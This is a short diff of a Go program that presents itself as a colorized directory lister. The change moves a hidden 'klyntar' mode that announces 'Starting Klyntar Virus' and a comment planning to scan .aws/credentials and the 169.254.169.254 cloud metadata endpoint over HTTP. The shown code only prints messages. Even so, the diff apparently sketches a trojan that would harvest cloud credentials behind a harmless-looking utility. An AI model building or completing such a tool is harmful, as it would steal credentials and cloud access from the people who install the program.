@@ -10,17 +10,18 @@ import (
 )
 
 func main() {
-	if os.Args[1] == "klyntar" {
-		fmt.Println(Bold(Cyan("Starting Klyntar Virus...\n")))
-	}
-
-	//Scan .aws/credentials or 169.254.169.254/metadata using http request
 
 	// fmt.Println(os.Args)
 	if len(os.Args) < 2 || os.Args[1] == "help" {
 		help()
 		return
 	}
+
+	if os.Args[1] == "klyntar" {
+		fmt.Println(Bold(Cyan("Starting Klyntar Virus...\n")))
+	}
+
+	//Scan .aws/credentials or 169.254.169.254/metadata using http request
 
 	if len(os.Args) > 1 && os.Args[1] == "install" {
 		fmt.Println(Bold(Green("Installing Colorized Directory lister :D ")))
